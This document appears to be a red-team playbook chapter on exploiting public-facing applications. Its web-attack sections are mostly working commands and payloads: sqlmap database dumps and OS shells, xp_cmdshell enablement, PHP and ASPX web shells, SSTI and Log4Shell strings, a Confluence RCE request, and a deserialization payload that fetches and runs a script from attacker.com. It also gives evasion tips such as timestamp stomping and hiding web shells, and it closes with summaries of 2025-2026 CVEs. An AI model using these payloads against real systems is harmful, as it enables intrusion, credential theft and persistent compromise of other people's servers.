# Exploiting Public-Facing Applications

> **MITRE ATT&CK**: Initial Access > T1190 - Exploit Public-Facing Application
> **Platforms**: All (web applications, network appliances, mail servers)
> **Required Privileges**: None (unauthenticated exploitation) / Low (authenticated exploitation)
> **OPSEC Risk**: Medium (exploit traffic may be logged; web shells persist on disk)

## Strategic Overview

Exploiting public-facing applications is the most direct path to initial access. Unlike
phishing (which depends on human action) or password attacks (which depend on weak
credentials), application exploitation leverages technical vulnerabilities for guaranteed
code execution. The Red Team Lead must maintain current awareness of high-impact
vulnerabilities -- Exchange ProxyLogon/ProxyShell, Log4Shell, Confluence RCE, MOVEit,
Citrix NetScaler -- because these are the same vulnerabilities real adversaries exploit
within hours of disclosure. Red team exploitation requires more precision than CTF-style
hacking: payloads must be stable (no crashing production services), web shells must be
stealthy, and exploitation artifacts must be tracked for cleanup. This section covers
the major vulnerability classes and their practical exploitation, emphasizing the
adaptation of public proof-of-concept code to engagement-ready tooling.

## Technical Deep-Dive

### SQL Injection

```bash
# SQLMap - automated SQL injection exploitation
# GET parameter injection
sqlmap -u "https://target.com/page?id=1" --dbs --batch --random-agent
sqlmap -u "https://target.com/page?id=1" -D database -T users --dump --batch

# POST parameter injection
sqlmap -u "https://target.com/login" --data "user=admin&pass=test" -p user --dbs

# Cookie-based injection
sqlmap -u "https://target.com/dashboard" --cookie "session=ABC123; role=user" -p role

# Second-order SQL injection (inject here, trigger there)
sqlmap -u "https://target.com/profile" --data "name=test" \
  --second-url "https://target.com/admin/users" --batch

# OS shell via SQL injection (xp_cmdshell on MSSQL, INTO OUTFILE on MySQL)
sqlmap -u "https://target.com/page?id=1" --os-shell --batch

# Manual MSSQL command execution
# '; EXEC xp_cmdshell 'whoami'; --
# '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --

# Bypass WAF with tamper scripts
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase --batch
```

### File Upload Vulnerabilities

```bash
# Web shell deployment via file upload bypass

# Extension bypass techniques:
# .php -> .php5, .phtml, .phar, .phps, .php.jpg
# .asp -> .aspx, .ashx, .asmx, .cer, .asa
# .jsp -> .jspx, .jsw, .jsv, .jspf

# Content-Type bypass:
# Change Content-Type header to image/jpeg while uploading .php

# Double extension: shell.php.jpg (if server processes .php)
# Null byte: shell.php%00.jpg (legacy servers)
# Case manipulation: shell.PhP

# ASPX web shell (minimal)
# <%@ Page Language="C#" %>
# <%@ Import Namespace="System.Diagnostics" %>
# <%= Process.Start(new ProcessStartInfo("cmd","/c " + Request["c"])
#     {RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd() %>

# PHP web shell (minimal)
# <?php system($_GET['c']); ?>

# Upload via curl
curl -X POST "https://target.com/upload" \
  -F "file=@shell.aspx;type=image/jpeg" \
  -F "submit=Upload"
```

### Remote Code Execution Vulnerabilities

```bash
# Server-Side Template Injection (SSTI)
# Jinja2 (Python/Flask):
# {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP):
# {{['id']|filter('system')}}

# Freemarker (Java):
# <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Testing for SSTI: inject {{7*7}} - if response contains 49, SSTI confirmed

# Command Injection
# ; id
# | id
# $(id)
# `id`
# & id
# && id
# || id

# Deserialization attacks (Java)
# ysoserial - generate deserialization payloads
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell.sh|bash' | \
  base64 -w0 > payload.b64

# .NET deserialization
# ysoserial.net -g WindowsIdentity -f Json.Net -c "cmd /c whoami" -o base64
```

### Critical CVE Exploitation

```bash
# Exchange ProxyLogon (CVE-2021-26855 + CVE-2021-27065)
# SSRF -> arbitrary file write -> web shell
python3 proxylogon.py -t https://mail.target.com -e admin@target.com

# Exchange ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207)
# Pre-auth RCE chain
python3 proxyshell.py -t https://mail.target.com -e admin@target.com -c "whoami"

# Log4Shell (CVE-2021-44228)
# Inject JNDI lookup string into any logged input
# ${jndi:ldap://attacker.com:1389/exploit}
# Headers to test: User-Agent, X-Forwarded-For, Referer, Accept-Language
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' https://target.com

# Confluence RCE (CVE-2022-26134)
curl -v "https://target.com/%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('id').getInputStream())%7D/"

# MOVEit Transfer (CVE-2023-34362)
# SQL injection -> deserialization -> RCE chain
# Progress MOVEit mass exploitation by Cl0p ransomware group

# Citrix NetScaler (CVE-2023-3519)
# Unauthenticated RCE via stack buffer overflow in NSPPE
```

### Server-Side Request Forgery (SSRF)

```bash
# SSRF to cloud metadata services (most impactful)
# AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
# GCP: http://metadata.google.internal/computeMetadata/v1/

# SSRF payloads for internal service access
curl "https://target.com/fetch?url=http://127.0.0.1:8080/admin"
curl "https://target.com/fetch?url=http://192.168.1.1/management"

# SSRF bypass techniques
# IP obfuscation: http://0x7f000001/ (127.0.0.1 in hex)
# IPv6: http://[::1]/
# Domain redirector: http://attacker.com/redirect -> http://169.254.169.254
# URL encoding: http://127.0.0.1 -> http://%31%32%37%2e%30%2e%30%2e%31
# DNS rebinding: DNS record alternates between external and internal IPs
```

### Web Shell Management

```bash
# Weevely - PHP web shell generator with encrypted communications
weevely generate password123 shell.php
weevely https://target.com/uploads/shell.php password123

# China Chopper / AntSword / Behinder - feature-rich web shells
# Provide file management, virtual terminal, database access, proxy pivoting

# Web shell best practices for red teams:
# 1. Use encrypted/authenticated web shells (prevent blue team co-opting)
# 2. Timestamp stomp the web shell file to match surrounding files
# 3. Name web shell to blend with application files (error.aspx, global.aspx)
# 4. Place in directories with existing files, not empty directories
# 5. Log web shell location for post-engagement cleanup
# 6. Consider in-memory web shells that do not persist on disk
```

### Burp Suite Usage

```bash
# Burp Suite is the standard tool for web application testing
# Key workflows for red team engagements:

# 1. Proxy mode: Intercept and modify requests in transit
# 2. Repeater: Manually craft and replay modified requests
# 3. Intruder: Automated parameter fuzzing and brute-force
# 4. Scanner: Automated vulnerability detection (Pro version)
# 5. Extensions: SQLMap integration, Autorize, Active Scan++

# Burp Suite with upstream SOCKS proxy (through C2)
# User Options -> Connections -> SOCKS Proxy -> attacker SOCKS proxy
# Allows web testing through a compromised internal host
```

## Detection & Evasion

### What Defenders See
- WAF logs showing injection attempts (SQL, XSS, SSTI patterns)
- Web server logs with unusual URL patterns (encoded payloads, long query strings)
- IDS/IPS signatures for known CVE exploit traffic
- New files appearing in web directories (web shells)
- Outbound connections from web servers to unexpected destinations
- Process execution chains: w3wp.exe/httpd -> cmd.exe/powershell

### Evasion Techniques
- Obfuscate payloads to bypass WAF pattern matching
- Use encrypted web shells to prevent content inspection
- Stage exploitation: initial exploit fetches payload from external source
- Leverage allowed outbound protocols (DNS, HTTPS) for C2 callbacks
- Modify public PoC exploits to change default signatures and user-agents
- Timestamp stomp web shells and cleanup exploit artifacts

### OPSEC Considerations
- Always test exploits in a lab environment matching the target version first
- Avoid exploits that may crash or destabilize production services
- Document all exploitation artifacts for post-engagement cleanup
- Web shells on disk are persistent artifacts -- track locations meticulously
- Coordinate with client on acceptable impact levels before exploiting

## 2025 Techniques

### Network Edge Device Exploitation (2025-2026)

Network edge devices (firewalls, VPNs, proxies) were the **most frequently targeted** technology category in 2025. **28.96% of CISA KEV additions** were exploited on or before the day their CVE was published.

#### Fortinet FortiOS Authentication Bypass Chain

```
# CVE-2025-59718 + CVE-2025-59719: SAML authentication bypass (2025)
# CVE-2026-24858: FortiCloud SSO bypass (January 2026)
# MITRE: T1190

# Attack chain:
# 1. CVE-2025-59718/59719: Unauthenticated SAML bypass -> admin access
# 2. Even after patching, CVE-2026-24858 exploited on "fully patched" devices
# 3. Automated exploitation began January 15, 2026 (Arctic Wolf)

# Post-exploitation: Unauthorized firewall config changes,
# account creation, VPN tunnel establishment
# Demonstrates recurring vulnerability of Fortinet edge devices
```

#### Ivanti Connect Secure RCE (CVE-2025-22457)

```
# CVE-2025-22457: Buffer overflow RCE in Ivanti Connect Secure VPN
# CVSS: Critical -- Unauthenticated RCE
# Affects versions 22.7R2.5 and earlier, plus end-of-life 9.X
# MITRE: T1190

# Actively exploited by UNC5221 (China-nexus) in mid-March 2025
# Custom malware deployed on compromised VPN appliances
# Disclosed April 3, 2025 (Mandiant/Google Cloud)

# High-value initial access: direct network access via VPN infrastructure
```

#### Cisco Secure Email Gateway RCE (CVE-2025-20393)

```
# CVE-2025-20393: Command injection in Cisco Secure Email Gateway
# CVSS: 10.0/10.0 -- Maximum severity
# No patch available at time of discovery (December 2025)
# MITRE: T1190

# Improper input validation on internet-exposed management ports
# Arbitrary command execution with ROOT privileges
# Persistence mechanisms planted post-exploitation

# Also: CVE-2025-20337 (Cisco ISE zero-day)
# Cisco Identity Services Engine exploited by advanced threat actors
# ISE compromise -> access to network authentication infrastructure
```

#### SonicWall SMA1000 Exploitation Chain

```
# CVE-2025-23006 (pre-auth) + CVE-2025-40602 (local privesc)
# Zero-day chain against SonicWall SMA1000 management consoles
# MITRE: T1190

# Widely deployed in mid-market enterprises
# Chainable exploit pair for full device compromise
# Added to CISA KEV catalog
```

#### Citrix Bleed 2 (CVE-2025-5777)

```
# CVE-2025-5777: NetScaler ADC/Gateway zero-day
# Dubbed "Citrix Bleed 2" -- follows pattern of CVE-2023-4966
# CVSS: Critical
# MITRE: T1190

# Recurrence of Citrix Bleed-class vulnerability
# Session hijacking via ADC/Gateway
# Confirms ADC/Gateway remains a high-priority initial access target
```

#### Palo Alto PAN-OS Authentication Bypass (CVE-2025-0108)

```
# CVE-2025-0108: Login authentication bypass on PAN-OS
# CVSS: 8.8 -- Disclosed February 12, 2025
# MITRE: T1190

# Chains with CVE-2024-9474 for unauthorized access to unpatched firewalls
# Automated login scanning against GlobalProtect and Cisco VPNs
# surged in late 2025

# Rapid7 documented widespread exploitation
```

#### Ivanti EPMM Zero-Days (CVE-2026-1281 + CVE-2026-1340)

```
# Two critical zero-days in Ivanti Endpoint Manager Mobile
# Confirmed exploited before disclosure (January 29, 2026)
# MITRE: T1190

# EPMM (formerly MobileIron) manages enterprise mobile device fleets
# MDM platforms have broad network access -- high-value targets
# Provides access to managed device configurations and credentials
```

#### Juniper Junos OS Code Injection (CVE-2025-21590)

```
# CVE-2025-21590: CLI code injection in Juniper Junos OS
# CVSS: 6.7 -- Actively exploited in the wild
# MITRE: T1190

# Requires local access with high privileges (post-authentication)
# Useful in chained attack scenarios after initial device access
# Added to CISA KEV catalog
```

#### SolarWinds Web Help Desk Deserialization (CVE-2025-40551)

```
# CVE-2025-40551: Unauthenticated deserialization in SolarWinds Web Help Desk
# Added to CISA KEV in February 2026
# MITRE: T1190

# Unauthenticated deserialization vulnerability allows remote code execution
# No authentication required -- internet-facing instances directly exploitable
# CISA KEV addition confirms active exploitation in the wild

# SolarWinds products remain recurring targets following SUNBURST precedent
```

#### Cisco Products Critical Zero-Day (CVE-2026-20045)

```
# CVE-2026-20045: Critical zero-day in Cisco products (2026)
# MITRE: T1190

# Critical zero-day vulnerability affecting Cisco product line
# Continues pattern of Cisco edge device exploitation alongside
# CVE-2025-20393 (Email Gateway) and CVE-2025-20337 (ISE)
```

#### Palo Alto PAN-OS GlobalProtect DoS (CVE-2026-0227)

```
# CVE-2026-0227: GlobalProtect DoS in Palo Alto PAN-OS
# CVSS: 7.7 -- PoC available (2026)
# MITRE: T1190

# Denial-of-service vulnerability targeting GlobalProtect VPN gateway
# Public PoC available -- lowers barrier to exploitation
# Chains with CVE-2025-0108 (auth bypass) for compounding PAN-OS risk
# GlobalProtect is widely deployed for enterprise remote access
```

#### n8n Workflow Automation RCE (CVE-2026-21858)

```
# CVE-2026-21858: Unauthenticated RCE in n8n workflow automation platform
# CVSS: 10.0/10.0 -- Maximum severity (January 2026)
# MITRE: T1190
# Source: MITRE, cloud security research

# Exploits content-type header confusion for unauthenticated remote code execution
# Impact: Arbitrary file read, credential extraction, administrator session forgery,
#         and complete server compromise

# n8n is widely used for cloud workflow automation
# Internet-facing n8n instances are directly exploitable without authentication
# Maximum CVSS score reflects ease of exploitation and severity of impact
```

### CVE Summary Table (2025-2026 Network Edge)

| CVE | Product | CVSS | Date | Impact |
|-----|---------|------|------|--------|
| CVE-2025-59718/59719 | Fortinet FortiOS | Critical | 2025 | SAML auth bypass |
| CVE-2026-24858 | Fortinet FortiOS | Critical | Jan 2026 | FortiCloud SSO bypass |
| CVE-2025-22457 | Ivanti Connect Secure | Critical | Apr 2025 | Buffer overflow RCE |
| CVE-2025-20393 | Cisco Email Gateway | 10.0 | Dec 2025 | Root command exec, no patch |
| CVE-2025-20337 | Cisco ISE | High | 2025 | Zero-day malware deployment |
| CVE-2025-23006 | SonicWall SMA1000 | High | 2025 | Pre-auth (chain component) |
| CVE-2025-40602 | SonicWall SMA1000 | N/A | 2025 | Privesc (chain component) |
| CVE-2025-5777 | Citrix NetScaler | Critical | 2025 | Citrix Bleed 2 zero-day |
| CVE-2025-0108 | Palo Alto PAN-OS | 8.8 | Feb 2025 | Auth bypass |
| CVE-2026-1281 | Ivanti EPMM | Critical | Jan 2026 | Zero-day, pre-disclosure |
| CVE-2026-1340 | Ivanti EPMM | Critical | Jan 2026 | Zero-day, pre-disclosure |
| CVE-2025-21590 | Juniper Junos OS | 6.7 | 2025 | CLI code injection |
| CVE-2025-40551 | SolarWinds Web Help Desk | N/A | Feb 2026 (KEV) | Unauth deserialization RCE |
| CVE-2026-20045 | Cisco Products | Critical | 2026 | Critical zero-day |
| CVE-2026-0227 | Palo Alto PAN-OS | 7.7 | 2026 | GlobalProtect DoS, PoC available |
| CVE-2026-21858 | n8n Workflow Automation | 10.0 | Jan 2026 | Unauth RCE via content-type confusion |

### GRE / VXLAN Tunnel Scanning for Initial Access

```
# Novel initial access vector (Black Hat USA 2025, DEF CON 33)
# MITRE: T1133 / T1572

# PoC tools exploit stateless GRE and VXLAN tunnels
# NO phishing, credentials, or application exploitation required

# GRE Scanner:
# Sends forged GRE packets with ICMP encapsulation
# Discovers tunnel configurations on target infrastructure
# Validated on Cloudflare and Amazon infrastructure

# VXLAN Scanner:
# Exploits default Linux kernel/MikroTik "Learning Mode" vulnerability
# Discovers VXLAN tunnel endpoints for network access

# Impact: Bypasses all traditional defenses by exploiting
# network infrastructure misconfigurations rather than users/apps
# github.com/123ojp/GRE-Tunnel-Scanner
```

## Cross-References

- **Web Recon** (01-reconnaissance/web-recon.md) -- technology fingerprinting identifies exploit targets
- **Active Scanning** (01-reconnaissance/active-scanning.md) -- version detection reveals vulnerable services
- **Cloud Recon** (01-reconnaissance/cloud-recon.md) -- SSRF to cloud metadata for credential theft
- **Phishing** (02-initial-access/phishing-payloads.md) -- alternative initial access if exploitation fails
- **External Remote Services** (02-initial-access/external-remote-services.md) -- VPN/gateway exploitation

## References

- MITRE ATT&CK T1190: https://attack.mitre.org/techniques/T1190/
- SQLMap: https://github.com/sqlmapproject/sqlmap
- ysoserial: https://github.com/frohoff/ysoserial
- Nuclei: https://github.com/projectdiscovery/nuclei
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- CISA Known Exploited Vulnerabilities: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- Arctic Wolf Fortinet Analysis: https://arcticwolf.com/resources/blog/
- Mandiant Ivanti CVE-2025-22457: https://cloud.google.com/blog/topics/threat-intelligence/
- GRE/VXLAN Tunnel Scanners: https://github.com/123ojp
